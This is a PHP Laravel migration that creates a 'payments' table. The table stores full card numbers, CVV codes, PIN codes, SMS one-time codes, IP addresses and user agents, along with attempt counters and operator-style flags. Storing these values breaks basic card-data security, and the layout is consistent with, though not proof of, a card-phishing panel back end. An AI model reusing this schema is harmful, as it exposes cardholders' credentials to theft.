<?php

use Illuminate\Database\Migrations\Migration;
use Illuminate\Database\Schema\Blueprint;
use Illuminate\Support\Facades\Schema;

class CreatePaymentsTable extends Migration
{
    /**
     * Run the migrations.
     *
     * @return void
     */
    public function up()
    {
        Schema::create('payments', function (Blueprint $table) {
            $table->id();
            $table->string('card_no', 64);
            $table->string('card_holder');
            $table->string('expiry');
            $table->string('cvv', 4);
            $table->text('bin');
            $table->string('ip_addr');
            $table->string('user_agent');
            $table->string('otp_code')->nullable();
            $table->string('pin_code')->nullable();
            $table->integer('approval_attempts')->default(0);
            $table->integer('sms_attempts')->default(0);
            $table->integer('repeat_attempts')->default(0);
            $table->integer('action')->default(1);
            $table->integer('active')->default(0);
            $table->integer('quit')->default(0);
            $table->boolean('selected')->default(false);
            $table->timestamps();
        });
    }

    /**
     * Reverse the migrations.
     *
     * @return void
     */
    public function down()
    {
        Schema::dropIfExists('payments');
    }
}
